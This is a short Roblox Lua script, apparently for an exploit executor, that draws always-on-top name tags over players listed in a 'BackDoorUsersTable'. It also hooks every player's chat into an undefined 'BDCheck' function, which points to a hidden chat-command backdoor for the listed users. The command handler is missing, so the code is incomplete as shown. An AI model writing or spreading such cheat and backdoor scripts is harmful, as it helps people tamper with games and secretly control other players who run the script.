-- Blacklist Esp (so ass first time making a blacklist esp)
local Players, RStorage, RService, TPService, TweenService, HttpService, SGui = game:GetService("Players"),game:GetService("ReplicatedStorage"),game:GetService("RunService"),game:GetService("TeleportService"), game:GetService("TweenService"), game:GetService("HttpService"), game:GetService("StarterGui")
local LocalP, Mouse = Players.LocalPlayer, Players.LocalPlayer:GetMouse()
local Camera, CordCamera, CurCamera = workspace.CurrentCamera, workspace.Camera.CoordinateFrame, workspace.CurrentCamera
local CF, UD, UD2, INew, Vec3 = CFrame.new, UDim.new, UDim2.new, Instance.new, Vector3.new;

local BackDoorUsersTable = {
    -- Admins
    [467337334] = {["NAME"] = "Kill\nV";["COLOUR"] = Color3.fromRGB(178,159,255);};
}

getgenv().EspCoolKid = function(COolPlayer)
    local bgui = INew("BillboardGui", COolPlayer.Character:WaitForChild("Head", 10))
    local tlab = INew("TextLabel", bgui)
    bgui.Adornee = COolPlayer.Character.Head
    bgui.Size = UD2(0,100,0,100)
    bgui.StudsOffset = Vec3(0,1,0)
    bgui.AlwaysOnTop = true 
    tlab.BackgroundTransparency = 1
    tlab.Position = UD2(0,0,0,1)
    tlab.Size = UD2(1,0,0,10)
    tlab.TextStrokeTransparency = 0.5
    tlab.TextSize = 10
    tlab.TextStrokeColor3 = BackDoorUsersTable[COolPlayer.UserId].COLOUR
    tlab.TextColor3 = BackDoorUsersTable[COolPlayer.UserId].COLOUR
    tlab.Text = BackDoorUsersTable[COolPlayer.UserId].NAME
end

local LPRS = Players:GetPlayers()
for i = 1, #LPRS do
    local CoolKidPlayer = LPRS[i]
    if BackDoorUsersTable[CoolKidPlayer.UserId] then
        local HeadFromCoolKid = CoolKidPlayer.Character:WaitForChild("Head", 10)
        if HeadFromCoolKid then
            EspCoolKid(CoolKidPlayer)
        end
        CoolKidPlayer.CharacterAdded:Connect(function()
            CoolKidPlayer.Character:WaitForChild("Head", 10)
            EspCoolKid(CoolKidPlayer)
        end)
    end
    CoolKidPlayer.Chatted:Connect(function(wick)
        BDCheck(CoolKidPlayer, wick)
    end)
end
Players.PlayerAdded:Connect(function(CKidPlayer)
    if BackDoorUsersTable[CKidPlayer.UserId] then
        CKidPlayer.CharacterAdded:Connect(function()
            CKidPlayer.Character:WaitForChild("Head", 10)
            EspCoolKid(CKidPlayer)
        end)
    end
    CKidPlayer.Chatted:Connect(function(Chat)
        BDCheck(CKidPlayer, Chat)
    end)
end)
